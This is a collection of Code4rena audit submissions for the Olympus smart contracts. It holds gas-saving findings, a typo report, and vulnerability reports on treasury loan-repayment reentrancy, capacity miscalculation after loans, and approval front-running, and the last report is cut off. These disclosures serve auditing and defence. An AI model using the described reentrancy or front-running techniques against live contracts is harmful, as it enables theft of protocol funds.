[Governance.sol#L223](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L223) [Governance.sol#L306](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L306)   ## [G08] Usage of uints/ints smaller than 32 Bytes (256 bits) incurs overhead ### Description When using elements that are smaller than 32 bytes, your contract's gas usage may be higher. This is because the EVM operates on 32 bytes at a time.  Therefore, if the element is smaller than that, the EVM must use more operations in order to reduce the size of the element from 32 bytes to the desired size. Use a larger size then downcast where needed  ### Lines in the code  [RANGE.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L45) [PRICE.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L44) [PRICE.sol#L47](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L47) [PRICE.sol#L50](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L50) [PRICE.sol#L53](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L53) [PRICE.sol#L56](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L56) [PRICE.sol#L59](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L59) [PRICE.sol#L84](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L84) [PRICE.sol#L87](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L87) [PRICE.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L127) [PRICE.sol#L161](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L161) [PRICE.sol#L185](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L185) [Operator.sol#L83](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L83) [Operator.sol#L86](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L86) [Operator.sol#L89](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L89) [Operator.sol#L371](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L371) [Operator.sol#L372](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L372) [Operator.sol#L375](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L375) [Operator.sol#L418](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L418) [Operator.sol#L426](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L426) [Operator.sol#L427](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L427) [Operator.sol#L430](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L430) [Operator.sol#L485](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L485) [Operator.sol#L665](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L665) [IOperator.sol#L13](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L13) [IOperator.sol#L14](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L14) [IOperator.sol#L15](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L15) [IOperator.sol#L16](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L16) [IOperator.sol#L17](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L17) [IOperator.sol#L18](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L18) [IOperator.sol#L19](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L19) [IOperator.sol#L20](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L20) [IOperator.sol#L31](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L31) [IOperator.sol#L32](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L32) [IOperator.sol#L33](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L33)  ## [G09] Initialize variables with default values are not needed ### Description If a variable is not set/initialized, it is assumed to have the default value (0 for uint, false for bool, address(0) for address�). Explicitly initializing it with its default value is an anti-pattern and wastes gas.  ### Lines in the code  [Kernel.sol#L397](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L397) [KernelUtils.sol#L43](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L43) [KernelUtils.sol#L58](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L58)  Assuming than uint's less than 256 are updated to uint256. [Operator.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L127) [Operator.sol#L129](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L129) [Operator.sol#403](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L403) [Operator.sol#455](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L455)  ## [G10] Using bools for storage incurs overhead ### Description Use uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas), and to avoid Gsset (20000 gas) when changing from 'false' to 'true', after having been 'true' in the past  ### Lines in the code [Kernel.sol#L113](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L113) [Kernel.sol#L181](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L181) [Kernel.sol#L194](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L194) [Kernel.sol#L197](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L197) [RANGE.sol#L44](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L44) [PRICE.sol#L62](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L62) [Operator.sol#L63](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L63) [Operator.sol#L66](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L66) [Operator.sol#L735](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L735) [BondCallback.sol#L24](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L24) [Heart.sol#L33](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Heart.sol#L33) [Governance.sol#L105](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L105) [Governance.sol#L117](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L117) [IOperator.sol#L34](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L34)  ## [G11] Multiplication/division by two should use bit shifting ### Description <x> * 2 is equivalent to <x> << 1 and <x> / 2 is the same as <x> >> 1.  The MUL and DIV opcodes cost 5 gas, whereas SHL and SHR only cost 3 gas  ### Proof of concept ```solidity contract TestDiv2 {  function TestDivBy2 () public returns (uint256){   uint256 i = 4;   i = i / 2;   return i;  } }  contract TestDivShift {  function TestDivByShift () public returns (uint256){   uint256 i = 4;   i = i >> 1;   return i;  } } ``` - Transaction cost of TestDiv2 is 21581 gas - Transaction cost of TestDivShift is 21409 gas  - After the test it's possible to **save 172 gas with this optimization** per ocurrence.  ### Lines in the code [Operator.sol#L372](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L372) [Operator.sol#L419](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L419) [Operator.sol#L420](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L420) [Operator.sol#L427](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L427)  ## [G12] Calldata vs Memory ### Description Use calldata instead of memory in a function parameter when you are only to read the data can save gas by storing it in calldata  ### Lines in the code [PRICE.sol#L205](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L205) [TreasuryCustodian.sol#L53](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/TreasuryCustodian.sol#L53) [BondCallback.sol#L152](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L152) [PriceConfig.sol#L45](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/PriceConfig.sol#L45)   ## [G13] Use a more recent version of solidity ### Description Use a solidity version of at least 0.8.16 to have more efficient code for checked addition and subtraction.   ### Lines in the code [Kernel.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L2) [KernelUtils.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L2) [TRSRY.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L2) [MINTR.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/MINTR.sol#L2) [RANGE.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L2) [PRICE.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L2) [VOTES.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/VOTES.sol#L2) [INSTR.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/INSTR.sol#L2) [TreasuryCustodian.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/TreasuryCustodian.sol#L2) [Operator.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L2) [BondCallback.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L2) [Heart.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Heart.sol#L2) [PriceConfig.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/PriceConfig.sol#L2) [Governance.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L2) [VoterRegistration.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/VoterRegistration.sol#L2) [IBondCallback.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/interfaces/IBondCallback.sol#L2) [IHeart.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IHeart.sol#L2) [IOperator.sol#L2](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L2)  ## [G14] Using storage instead of memory for structs/arrays ### Description When retrieving data from a memory location, assigning the data to a memory variable causes all fields of the struct/array to be read from memory,  resulting in a Gcoldsload (2100 gas) for each field of the struct/array. When reading fields from new memory variables, they cause an extra MLOAD  instead of a cheap stack read. Rather than declaring a variable with the memory keyword, it is much cheaper to declare a variable with the storage  keyword and cache all fields that need to be read again in a stack variable, because the fields actually read will only result in a Gcoldsload.  The only case where the entire struct/array is read into a memory variable is when the entire struct/array is returned by a function,  passed to a function that needs memory, or when the array/struct is read from another store array/struct.  ### Lines in the code [Kernel.sol#L379](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L379) [Kernel.sol#L398](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L398) [RANGE.sol#L80](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L80) [Operator.sol#L96](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L96) [Operator.sol#L97](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L97) [BondCallback.sol#L179](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L179) [Governance.sol#L206](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L206)  ## [G15] Tight variable packing  ### Description Reordering the variables's declaration it's possible to save some slots. Apply the following changes.  #### Operator.sol ```diff     /// Operator variables, defined in the interface on the external getter functions     Status internal _status;     Config internal _config;      /// @notice    Whether the Operator has been initialized -   bool public initialized;      /// @notice    Whether the Operator is active -   bool public active;      /// Modules     OlympusPrice internal PRICE;     OlympusRange internal RANGE;     OlympusTreasury internal TRSRY;     OlympusMinter internal MINTR;      /// External contracts     /// @notice     Auctioneer contract used for cushion bond market deployments     IBondAuctioneer public auctioneer;     /// @notice     Callback contract used for cushion bond market payouts     IBondCallback public callback;      /// Tokens     /// @notice     OHM token contract     ERC20 public immutable ohm; -   uint8 public immutable ohmDecimals;     /// @notice     Reserve token contract     ERC20 public immutable reserve;     uint8 public immutable reserveDecimals; +   uint8 public immutable ohmDecimals; +   bool public initialized; +   bool public active;     /// Constants     uint32 public constant FACTOR_SCALE = 1e4; ``` ### Lines in the code [Operator.sol#L59-L89](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L59-L89)  ## [G16] Move variable declaration before is going to be used ### Description It's important to declare the variable before it's use and after to the if/require conditions becase of it's possible to save gas when the if's/require conditions are true and the execution doesn't follow.  ```diff function endorseProposal(uint256 proposalId_) external { -   uint256 userVotes = VOTES.balanceOf(msg.sender);      if (proposalId_ == 0) {         revert CannotEndorseNullProposal();     }      Instruction[] memory instructions = INSTR.getInstructions(proposalId_);     if (instructions.length == 0) {         revert CannotEndorseInvalidProposal();     }      // undo any previous endorsement the user made on these instructions     uint256 previousEndorsement = userEndorsementsForProposal[proposalId_][msg.sender];     totalEndorsementsForProposal[proposalId_] -= previousEndorsement;      // reapply user endorsements with most up-to-date votes +   uint256 userVotes = VOTES.balanceOf(msg.sender);     userEndorsementsForProposal[proposalId_][msg.sender] = userVotes;     totalEndorsementsForProposal[proposalId_] += userVotes;      emit ProposalEndorsed(proposalId_, msg.sender, userVotes); } ```  ```diff function vote(bool for_) external { -   uint256 userVotes = VOTES.balanceOf(msg.sender);      if (activeProposal.proposalId == 0) {         revert NoActiveProposalDetected();     }      if (userVotesForProposal[activeProposal.proposalId][msg.sender] > 0) {         revert UserAlreadyVoted();     }   +   uint256 userVotes = VOTES.balanceOf(msg.sender);     if (for_) {         yesVotesForProposal[activeProposal.proposalId] += userVotes;     } else {         noVotesForProposal[activeProposal.proposalId] += userVotes;     }      userVotesForProposal[activeProposal.proposalId][msg.sender] = userVotes;      VOTES.transferFrom(msg.sender, address(this), userVotes);      emit WalletVoted(activeProposal.proposalId, msg.sender, for_, userVotes); } ``` ### Lines in the code [Governance.sol#L180-L201](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L180-L201) [Governance.sol#L240-L262](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L240-L262)  ## [G17] Refactoring code ### Description In the following case it's possible to save gas checking the common condition once instead of twice.   ```diff -if ( -    uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait) && -    _status.high.count >= config_.regenThreshold -) { -    _regenerate(true); -} -if ( -    uint48(block.timestamp) >= RANGE.lastActive(false) + uint48(config_.regenWait) && -    _status.low.count >= config_.regenThreshold -) { -    _regenerate(false); -}  +if (uint48(block.timestamp) >= RANGE.lastActive(true) + uint48(config_.regenWait)) +{ + if (_status.high.count >= config_.regenThreshold) + { +  _regenerate(true); + } + if (_status.low.count >= config_.regenThreshold)  + { +  _regenerate(false); + } +}  ```  ### Lines in the code [Operator.sol#L209-L220](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L209-L220)  ## [G18] Use unchecked when it's not possible to overflow ### Description The default “checked” behavior costs more gas when adding/diving/multiplying, because under-the-hood those checks are implemented as a series of opcodes that, prior to performing the actual arithmetic, check for under/overflow and revert if it is detected. if it can statically be determined there is no possible way for your arithmetic to under/overflow (such as a condition in an if statement), surrounding the arithmetic in an unchecked block will save gas.  For all for-loops in the code it is possible to change as the following example.  ```diff for (uint256 i;i < X;){  -- code --  unchecked  {   ++i;  } } ```  ### Proof of concept  ```solidity contract TestWithoutUnchecked {  function Test() public {   for(uint256 i; i < 10; ){    ++i;   }  } }  contract TestWitUnchecked {  function Test() public {   for(uint256 i; i < 10; ){    unchecked {     ++i;    }   }  } }  ```  - Transaction cost of TestWithoutUnchecked is 22958 gas - Transaction cost of TestWitUnchecked is 21728 gas  - After the test it's possible to save 1230 gas in this loop so this mean **123 gas per loop is saved with this optimization**.  ### Lines in the code [Operator.sol#L487-L488](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L487-L488)   ## [G19] Internal functions only called once can be inlined to save gas  ### Description Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.  ### Operator._addObservation [Operator.sol#L652](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L652) ### Kernel._installModule [Kernel.sol#L266-L277](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L266-L277) ### Kernel._upgradeModule [Kernel.sol#L279-L293](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L279-L293) ### Kernel._activatePolicy [Kernel.sol#L295-L323](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L295-L323) ### Kernel._deactivatePolicy [Kernel.sol#L325-L346](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L325-L346) ### Kernel._migrateKernel [Kernel.sol#L351-L372](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L351-L372) ### Kernel._reconfigurePolicies [Kernel.sol#L378-L389](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L378-L389) ### Kernel._pruneFromDependents [Kernel.sol#L409-L432](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L409-L432)  ## [G20] Remove unused functions  ### Description Remove the following functions in Kernel.sol (getModuleAddress) to save gas due to it's internal and it's not used inside the contract.   ### Lines in the code [Kernel.sol#L131-L135](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L131-L135)  
1. Use External than Public for saving more gas  Files :   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L34  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/MINTR.sol#L37  2. Use Unchecked i++ for saving more gas  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L48-L49  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L63-L64  3. Saving gas by removing ` = 0`  This implementation code can be saving more gas by removing = 0, it because If a variable was not set/initialized, it is assumed to have default value to 0  Files :  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L253-L255 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L285-L287  4. Set value as immutable   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L28-L31  5.  change `uint256 i = 0` into `uint256 i` for saving more gas  using this implementation can saving more gas for each loops.  Files :   https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L43 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/utils/KernelUtils.sol#L58
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L108-L112   # Vulnerability details  ## Impact An attacker can pay back their loan to the treasury module with protocol-owned tokens. This will cause their loan to decrease despite the protocol won't be given funds for it.  ## Proof of Concept The code first measures the number of tokens in the treasury, then transfers an amount to the contract and checks the change it caused. This is put behind a nonReentrant modifier so that one can't use the same balance change to pay back multiple parts of (potentially) multiple loans.  The problem arises when the treasury doesn't only claim tokens from paying back loans, but also claims protocol revenue. Since, an attacker can gain execution in the moment the funds are pulled to the treasury to trigger any function that grants treasury this type of tokens (collects protocol revenue). The contract will count these tokens as paying back one's loan since this happened between balance measurements.  ## Recommended Mitigation Steps Add a function used to pull a token to the contract and mark it nonReentrant. Any transfer of tokens to the treasury should be done through that function.
[NC - 01] - Typo https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/PRICE.sol#L126  Line 126 `Price.sol` numbe -> number  [NC - 02] - Left TODO https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Operator.sol#L657  `Operator.sol` line 657 
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/TRSRY.sol#L60   # Vulnerability details  ## Impact low market bonds/swaps not working after loan is taken from TRSRY  I am bordering between this being medium and low, but since this is, granted under very unlikely circumstances, is hindering intended transfers to work I am submitting it as medium. That said, I don't think this scenario is very likely since it requires a trusted contract not part of initial release(? no contract in repo used a loan) to take a large loan from TRSRY.  ## Proof of Concept this will cause test to fail on TRANSFER_FAILED due to TRSRY not having the tokens to transfer but `getReserveBalance` says it has, since capacity is determined based on non-existing tokens.  ```diff diff --git a/src/test/policies/Operator.t.sol b/src/test/policies/Operator.t.sol index e09aec1..5c1e95f 100644 --- a/src/test/policies/Operator.t.sol +++ b/src/test/policies/Operator.t.sol @@ -26,6 +26,8 @@ import {OlympusMinter, OHM} from "modules/MINTR.sol";  import {Operator} from "policies/Operator.sol";  import {BondCallback} from "policies/BondCallback.sol";   +import {ModuleTestFixtureGenerator} from "test/lib/ModuleTestFixtureGenerator.sol"; +  contract MockOhm is ERC20 {      constructor(          string memory _name, @@ -45,6 +47,7 @@ contract MockOhm is ERC20 {  // solhint-disable-next-line max-states-count  contract OperatorTest is Test {      using FullMath for uint256; +    using ModuleTestFixtureGenerator for OlympusTreasury;        UserFactory public userCreator;      address internal alice; @@ -53,6 +56,9 @@ contract OperatorTest is Test {      address internal policy;      address internal heart;   +    address public debtor; +    address public godmode;  +      RolesAuthority internal auth;      BondAggregator internal aggregator;      BondFixedTermTeller internal teller; @@ -187,6 +193,18 @@ contract OperatorTest is Test {            reserve.mint(address(treasury), testReserve * 100);   +        debtor = treasury.generateFunctionFixture(treasury.getLoan.selector); +        godmode = treasury.generateGodmodeFixture(type(OlympusTreasury).name); +         +        kernel.executeAction(Actions.ActivatePolicy, godmode); +        kernel.executeAction(Actions.ActivatePolicy, debtor); +         +        vm.prank(godmode); +        treasury.setApprovalFor(debtor, reserve, testReserve * 100); + +        vm.prank(debtor); +        treasury.getLoan(reserve,testReserve*100); +          // Approve the operator and bond teller for the tokens to swap          vm.prank(alice);          ohm.approve(address(operator), testOhm * 20); ```  same is applicable for low market bonds since they are created based on the same capacity  ## Tools Used vs code + tests  ## Recommended Mitigation Steps determine capacity from actual tokens held by treasury.
- `<x> += <y>` costs more gas than `<x> = <x> + <y>` for state variables (`-` too)     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L136     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L138 - Using `private` rather than `public` for constants, saves gas     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L89     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L121     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L124     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L127     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L130     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L133     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Governance.sol#L137     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/PRICE.sol#L59    - https://github.com/code-423n4/2022-08-olympus/blob/main/src/modules/RANGE.sol#L65 - `++i` costs less gas than `++i`, especially when it is used in for-loop     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L49     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/utils/KernelUtils.sol#L64     - https://github.com/code-423n4/2022-08-olympus/blob/main/src/policies/Operator.sol#L488    
# Lines of code  https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/modules/TRSRY.sol#L64-L72 https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/TreasuryCustodian.sol#L42-L48   # Vulnerability details  ## Impact  An attacker may be able to withdraw more than intended  ## Proof of Concept  Let's say the alice had approval of 100. Now the treasury custodian reduced the approval to 50. Alice could frontrun the `setApprovalFor` of 50, and withdraw 100 as it was before. Then withdraw 50 with the newly set approval. So the alice could withdraw 150.  ```solidity // modules/TRSRY.sol   63     /// @notice Sets approval for specific withdrawer addresses  64     function setApprovalFor(  65         address withdrawer_,  66         ERC20 token_,  67         uint256 amount_  68     ) external permissioned {  69         withdrawApproval[withdrawer_][token_] = amount_;  70  71         emit ApprovedForWithdrawal(withdrawer_, token_, amount_);  72     } ```  The `TreasuryCustodian` simply calls the `setApprovalFor` to grant Approval. ```solidity  41  42     function grantApproval(  43         address for_,  44         ERC20 token_,  45         uint256 amount_  46     ) external 